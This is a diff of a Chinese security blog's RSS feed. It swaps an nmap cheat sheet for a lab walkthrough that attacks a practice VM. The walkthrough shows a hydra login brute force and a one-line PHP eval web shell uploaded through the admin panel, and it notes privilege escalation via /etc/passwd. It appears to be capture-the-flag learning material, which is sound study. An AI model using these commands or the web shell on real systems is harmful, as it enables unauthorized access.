@@ -5,72 +5,81 @@
         <link>https://liuhuo23.github.io</link>
         <description></description>
         <language>zh-CN</language>
-        <pubDate>Tue, 25 Jan 2022 19:17:46 +0800</pubDate>
-        <lastBuildDate>Tue, 25 Jan 2022 19:17:46 +0800</lastBuildDate>
-        <category>MySQL</category>
+        <pubDate>Wed, 23 Feb 2022 19:17:46 +0800</pubDate>
+        <lastBuildDate>Wed, 23 Feb 2022 19:17:46 +0800</lastBuildDate>
+        <category>socket</category>
+        <category>渗透</category>
+        <category>服务器</category>
         <category>web</category>
         <category>web容器</category>
+        <category>xss</category>
+        <category>信息收集</category>
         <category>信息安全</category>
+        <category>mysql</category>
+        <category>搜索</category>
         <category>操作系统</category>
         <category>网络</category>
-        <category>IP</category>
-        <category>socket</category>
-        <category>rust</category>
-        <category>服务器</category>
-        <category>搜索</category>
-        <category>密码</category>
-        <category>trait</category>
-        <category>linux</category>
-        <category>PHP</category>
-        <category>渗透</category>
         <category>破解密码</category>
         <category>nmap</category>
-        <category>vue</category>
+        <category>MySQL</category>
+        <category>IP</category>
+        <category>密码</category>
+        <category>linux</category>
+        <category>vue3</category>
         <category>electron</category>
+        <category>PHP</category>
+        <category>vue</category>
+        <category>rust</category>
+        <category>trait</category>
         <item>
-            <guid isPermalink="true">https://liuhuo23.github.io/2022/01/25/IS/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</guid>
-            <title>记一次密码破解</title>
-            <link>https://liuhuo23.github.io/2022/01/25/IS/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</link>
+            <guid isPermalink="true">https://liuhuo23.github.io/2022/02/23/IS/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</guid>
+            <title>渗透主机</title>
+            <link>https://liuhuo23.github.io/2022/02/23/IS/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</link>
             <category>破解密码</category>
             <category>nmap</category>
-            <pubDate>Tue, 25 Jan 2022 19:17:46 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;记一次密码破解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#记一次密码破解&#34;&gt;#&lt;/a&gt; 记一次密码破解&lt;/h1&gt;
-&lt;h2 id=&#34;nmap-简单用法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nmap-简单用法&#34;&gt;#&lt;/a&gt; nmap 简单用法&lt;/h2&gt;
-&lt;p&gt;nmap -v 详细信息输出&lt;br&gt;
- nmap -p 指定端口&lt;br&gt;
- nmap -iL 扫描文件中的 ip&lt;br&gt;
-nmap -exclude 不扫描某些 ip&lt;br&gt;
-nmap -Pn 使用 ping 扫描，显式地关闭端口扫描，用于主机发现&lt;br&gt;
- nmap -sn 使用 ping 扫描，进行端口扫描，假设主机都是 up 的&lt;br&gt;
- nmap -sS 使用 SYN 扫描，不需要完成三次握手&lt;br&gt;
- nmap -sT TCP connect 扫描，需要完成三次握手，只适用于找出 TCP 和 UDP 端口&lt;br&gt;
- nmap -sU 扫描 UDP 端口&lt;br&gt;
- nmap -sF FIN 扫描，用于探测防火墙状态，识别端口是否关闭，容易漏扫&lt;br&gt;
- nmap -sV 扫描目标主机的端口和软件版本&lt;br&gt;
- nmap -O 远程检测操作系统和软件&lt;br&gt;
- nmap -O --osscan-guess 猜测目标操作系统版本&lt;br&gt;
- nmap -traceroute 路由跟踪&lt;br&gt;
- nmap -A 综合扫描，包含 1-10000 的端口 ping 扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测&lt;br&gt;
- nmap -oN result.txt 将标准输出写入到指定文件中&lt;br&gt;
- nmap -oX result.xml 将输入写成 xml 的形式&lt;br&gt;
- nmap -oS result.txt 将输出写成特殊符号的形式，内容跟 - oN 是一样的，只是字体变了而已&lt;br&gt;
- nmap -oG result.txt 将输出写成特殊格式&lt;br&gt;
- nmap -oA 将输出所有格式，有三种 .xml/.gnmap/ .nmap&lt;br&gt;
-nmap -T [0-5] 时间参数模板&lt;br&gt;
- - T0 用于躲避 IDS，时间很长&lt;br&gt;
- - T1 用于躲避 IDS，时间很长&lt;br&gt;
- - T2 降低了扫描速度，使用更小的带宽和目标主机资源对目标靶机进行扫描&lt;br&gt;
- - T3 默认模式，未做优化&lt;br&gt;
- - T4 假设用户具有合适及可靠的网络而加速对目标靶机的扫描&lt;br&gt;
- - T5 假设用户具有更好的网络或者愿意牺牲准确性而加速扫描&lt;br&gt;
- nmap -sC 根据端口识别服务自动调用默认脚本&lt;br&gt;
- nmap --script&lt;/p&gt;
-&lt;p&gt;作者：Pino_HD&lt;br&gt;
- 链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC80YzY5NmIxYTk1YjE=&#34;&gt;https://www.jianshu.com/p/4c696b1a95b1&lt;/span&gt;&lt;br&gt;
- 来源：简书&lt;br&gt;
-著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。&lt;/p&gt;
-&lt;h2 id=&#34;开始进行破解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#开始进行破解&#34;&gt;#&lt;/a&gt; 开始进行破解&lt;/h2&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap -O  &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.1.0/24 -oN nmap_scan_1.txt //扫描当前局域网下的所有主机&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; MAC nmap_scan_1.txt //过滤信息，获得IP以及对应的 系统&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
+            <pubDate>Wed, 23 Feb 2022 19:17:46 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;渗透主机&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#渗透主机&#34;&gt;#&lt;/a&gt; 渗透主机&lt;/h1&gt;
+&lt;h2 id=&#34;1-确定主机&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-确定主机&#34;&gt;#&lt;/a&gt; 1. 确定主机&lt;/h2&gt;
+&lt;p&gt;netdiscover 主机发现&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; netdiscover -i eth0 -r &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.1.0/24&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;扫描结果：可以根据靶机的 mvc 地址确定&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/liuhuo23/blog-img/main/img/baji1..png&#34; alt=&#34;image-20220223090630464&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2主机信息探测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2主机信息探测&#34;&gt;#&lt;/a&gt; 2. 主机信息探测&lt;/h2&gt;
+&lt;p&gt;信息探测：  &lt;code&gt;nmap -A -p- 192.168.1.48&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;zhuji.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以发现只开放了 80，22 端口。对应的服务 为 http，ssh&lt;/p&gt;
+&lt;p&gt;&lt;mark&gt;网站探测&lt;/mark&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gobuster &lt;span class=&#34;token function&#34;&gt;dir&lt;/span&gt; -u http://192.168.124.26 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;gobuster 是一个扫描网站目录的工具&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/liuhuo23/blog-img/main/img/ba2.png&#34; alt=&#34;image-20220223091458362&#34;&gt;&lt;/p&gt;
+&lt;p&gt;挨个访问子目录，查看有无切入点&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gobuster &lt;span class=&#34;token function&#34;&gt;dir&lt;/span&gt; -u http://192.168.124.26/websec/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/liuhuo23/blog-img/main/img/baji3.png&#34; alt=&#34;image-20220223091904305&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现有 admin 等疑似登录页面的反馈成功 即 status 为 200 的项&lt;/p&gt;
+&lt;p&gt;挨个访问，寻找切入点。最终发现，只有登录页面这么一个切入点，没有其他能绕开登录的。&lt;/p&gt;
+&lt;p&gt;没办法只能爆破。&lt;/p&gt;
+&lt;p&gt;但是发现登录名是邮箱，因此我们必须想办法获取他的邮箱。&lt;/p&gt;
+&lt;h2 id=&#34;3漏洞查找&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3漏洞查找&#34;&gt;#&lt;/a&gt; 3. 漏洞查找&lt;/h2&gt;
+&lt;p&gt;&lt;mark&gt;爆破登录点&lt;/mark&gt;&lt;/p&gt;
+&lt;p&gt;首先使用 cewl 获取字典，以下两种命令都行&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cewl http://192.168.124.26/websec/websec -d &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; -w wordlist.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cewl http://192.168.124.26/websec/websec &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; cewl.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;用户邮箱，你可以试着查看其他这个网站的其他页面，找到所有疑似邮箱的字符串然后挨个试&lt;/p&gt;
+&lt;p&gt;通过查找发现疑似  &lt;code&gt;contack@hacknos.com&lt;/code&gt;  然后爆破&lt;/p&gt;
+&lt;p&gt;查看网络源代码 找到 表单，进一步找到 用户名和密码的参数，然后随机输入一个密码 发现网站返回 Wrong email 的提示字样。&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;hydra -l contact@hacknos.com -P cewl.txt &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.1.48 http-post-form &lt;span class=&#34;token string&#34;&gt;&#34;/websec/admin:username=^USER^&amp;amp;password=^PASS^:Wrong email&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/liuhuo23/blog-img/main/img/baji4.png&#34; alt=&#34;image-20220223093138561&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这是一个随机生成密码的程序，因此如果破解不了，你可以试着去多运行几遍&lt;/p&gt;
+&lt;p&gt;登录进去查找切入点&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/liuhuo23/blog-img/main/img/baji6.png&#34; alt=&#34;image-20220223093703047&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;4-漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-漏洞利用&#34;&gt;#&lt;/a&gt; 4. 漏洞利用&lt;/h2&gt;
+&lt;p&gt;很好，可以上传文件。&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;//一句话爆破&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;?php &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;@eval&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;liuhuo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;然后用蚁剑访问&lt;/p&gt;
+&lt;h2 id=&#34;5-权限提升&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5-权限提升&#34;&gt;#&lt;/a&gt; 5. 权限提升&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;权限提升成功才是渗透成功标志&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;mark&gt;思路&lt;/mark&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;利用系统自带的软件进行权限提升&lt;/li&gt;
+&lt;li&gt;找到 /etc/passwd 破解密码&lt;/li&gt;
+&lt;li&gt;。。，&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
         </item>
     </channel>
 </rss>
